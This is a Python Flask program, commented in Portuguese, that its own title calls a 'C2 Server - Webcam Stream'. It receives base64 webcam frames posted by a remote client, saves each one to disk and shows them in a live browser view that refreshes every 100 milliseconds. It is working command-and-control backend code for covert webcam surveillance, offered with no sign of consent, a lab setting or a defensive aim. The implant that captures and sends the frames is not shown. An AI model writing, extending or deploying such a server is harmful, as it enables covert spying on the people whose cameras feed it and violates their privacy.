from flask import Flask, request, jsonify, render_template_string
import os
import base64
from datetime import datetime

app = Flask(__name__)

# HTML template com interface moderna
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Webcam Stream</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid #333;
            margin-bottom: 20px;
        }
        .stream-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
        }
        #stream {
            max-width: 800px;
            width: 100%;
            border: 3px solid #333;
            border-radius: 8px;
        }
        .status {
            background-color: #333;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
        }
        .timestamp {
            color: #00ff00;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>C2 Server - Webcam Stream</h1>
        </div>
        <div class="stream-container">
            <img id="stream" src="" alt="Webcam Stream">
        </div>
        <div class="status">
            Status: <span id="status">Aguardando conexão...</span>
            <br>
            Último frame: <span id="timestamp" class="timestamp">-</span>
        </div>
    </div>

    <script>
        const streamImg = document.getElementById('stream');
        const statusSpan = document.getElementById('status');
        const timestampSpan = document.getElementById('timestamp');
        
        function updateStream() {
            fetch('/get_latest_frame')
                .then(response => response.json())
                .then(data => {
                    if (data.frame) {
                        streamImg.src = 'data:image/jpeg;base64,' + data.frame;
                        statusSpan.textContent = 'Conectado';
                        timestampSpan.textContent = data.timestamp;
                    }
                })
                .catch(error => {
                    console.error('Erro:', error);
                    statusSpan.textContent = 'Erro na conexão';
                });
        }

        // Atualiza o stream a cada 100ms
        setInterval(updateStream, 100);
    </script>
</body>
</html>
'''

# Armazena o último frame recebido
latest_frame = None
latest_timestamp = None

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload_frame():
    global latest_frame, latest_timestamp
    try:
        data = request.json
        latest_frame = data['frame']
        latest_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        
        # Salva o frame em disco se necessário
        if not os.path.exists('captured_frames'):
            os.makedirs('captured_frames')
        
        frame_count = len(os.listdir('captured_frames'))
        frame_path = os.path.join('captured_frames', f"frame_{frame_count}.jpg")
        
        with open(frame_path, 'wb') as f:
            f.write(base64.b64decode(latest_frame))
        
        return jsonify({'message': 'Frame recebido com sucesso'}), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/get_latest_frame')
def get_latest_frame():
    if latest_frame is None:
        return jsonify({'frame': None, 'timestamp': None})
    return jsonify({
        'frame': latest_frame,
        'timestamp': latest_timestamp
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)